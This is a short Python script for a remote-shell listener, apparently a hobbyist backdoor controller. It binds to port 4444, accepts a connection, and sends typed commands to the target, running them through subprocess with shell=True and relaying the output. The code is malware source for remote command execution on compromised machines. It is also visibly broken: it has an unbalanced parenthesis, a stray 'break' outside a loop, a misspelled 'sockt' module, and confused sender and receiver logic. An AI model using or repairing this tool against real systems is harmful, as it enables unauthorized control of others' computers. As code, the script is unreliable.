import json
import socket
import subprocess

def reliable_send(data):
    json_data=json.dumps(data)
    target.send(json_data)

def reliable_recv():
    data=""
    while True:
        try:
            data=data+target.recv(1024)
            return json.loads((data)
        except:
            continue

def shell():
    command=input("Command: %s" %str(ip))
    reliable_send(command)
    if command=="q":
        break
    else:
        proc=subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result=proc.stdout.read()+proc.stderr.read()
        reliable_send(result)
     
def server():
      global s
      global ip
      global target
      s=sockt.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      s.bind(("192.168.0.1", 4444))
      s.listen(5)
      print("Listening to incoming connections...")
      target, ip = s.accept()
      print("Connection established with: %s" %str(ip))
  
server()
shell()

s.close()
